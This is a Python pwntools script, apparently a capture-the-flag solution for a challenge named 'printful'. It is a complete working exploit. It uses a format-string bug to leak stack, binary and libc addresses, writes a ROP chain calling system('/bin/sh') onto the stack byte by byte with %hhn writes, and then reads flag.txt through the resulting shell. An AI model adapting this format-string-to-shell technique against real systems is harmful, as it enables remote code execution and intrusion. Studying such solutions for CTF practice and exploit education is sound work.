#!/usr/bin/env python3

import struct

from pwn import *

context.arch = "amd64"
context.log_level = "info"

chal = remote("printful.challs.pwnoh.io", 1337, ssl=True)


def wait_til_prompt():
    return chal.recvuntil(b"> ")


def dump_address(address, format="p"):
    leak_part = f"|%24${format}|EOF_prnt".encode()
    out = leak_part.ljust(136, b"A") + b"EOF_prnt" + struct.pack("Q", address)
    chal.sendline(out)
    return chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")].split(b"|")[1]


def leak_position(position, format="p"):
    chal.sendline(f"%{position}${format}EOF_prnt".encode())
    return chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")]


def get_image_base():
    base = int(leak_position(34), 16) & ~0xFFF
    return base - 0x2000


wait_til_prompt()
image_base = get_image_base()

wait_til_prompt()
printf_got = struct.unpack(
    "Q", dump_address(image_base + 0x3FB8, "s").ljust(8, b"\x00")
)[0]

libc_base = printf_got - 0x061C90
pop_rdi = libc_base + 0x23B6A
binsh = libc_base + 0x1B45BD
system = libc_base + 0x52290
ret_gadget = libc_base + 0x22679

wait_til_prompt()
stack_4 = int(leak_position(4, "p"), 16)
ret_addr_loc = stack_4 + ((41 - 4) * 8)

rop_chain = [
    ret_gadget,  # align stack
    pop_rdi,  # pop rdi; ret
    binsh,  # "/bin/sh"
    system,  # system()
]

for i, gadget in enumerate(rop_chain):
    log.info(f"writing gadget {i + 1}/4: {gadget:#x}")

    for byte_idx in range(8):
        byte_val = (gadget >> (byte_idx * 8)) & 0xFF
        target = ret_addr_loc + (i * 8) + byte_idx

        if byte_val == 0:
            fmt = b"%256c%23$hhn"
        else:
            fmt = f"%{byte_val}c%23$hhn".encode()

        payload = fmt + (b"A" * (136 - len(fmt))) + struct.pack("Q", target)

        wait_til_prompt()
        chal.sendline(payload)

wait_til_prompt()
chal.sendline(b"q")

sleep(0.5)

chal.sendline(b"cat flag.txt")
sleep(0.5)

flag = chal.recvall(timeout=3)
print(flag)
